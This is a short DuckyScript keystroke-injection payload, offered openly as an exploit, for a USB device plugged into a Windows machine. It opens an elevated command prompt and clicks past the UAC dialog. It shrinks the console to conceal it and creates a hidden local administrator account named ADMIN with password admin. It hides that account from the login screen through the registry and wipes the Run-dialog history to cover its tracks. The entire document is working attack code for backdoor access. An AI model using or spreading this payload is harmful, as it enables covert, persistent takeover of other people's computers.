Author: SULAMAN SAEED  
Description: Exploit to create a new local administrator account _ADMIN_ with the password _admin_.  
Hide user from user settings and from login screen.


```
REM Start delay
DELAY 1000
DELAY 300
GUI r
DELAY 300

STRING powershell Start-Process cmd -Verb runAs
DELAY 300
ENTER
    
DELAY 2000
REM bypassing security dialog
ALT y
DELAY 500
REM obfuscationg terminal
STRING mode con:cols=18 lines=1
DELAY 300
ENTER
REM changing color
STRING color 78
DELAY 300
ENTER
REM adding user usename = ADMIN password is admin 
STRING net user /add ADMIN admin
DELAY 300
ENTER
REM Adding user in administrators group
STRING net localgroup administrators ADMIN /add
DELAY 300
ENTER
REM Hiding the user via editing registory
STRING REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
DELAY 300
ENTER

STRING REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v ADMIN /t REG_DWORD /d 0
DELAY 300
ENTER

REM removing the footprints.
STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
DELAY 300
ENTER
REM Safe exiting
STRING exit
DELAY 300
ENTER
```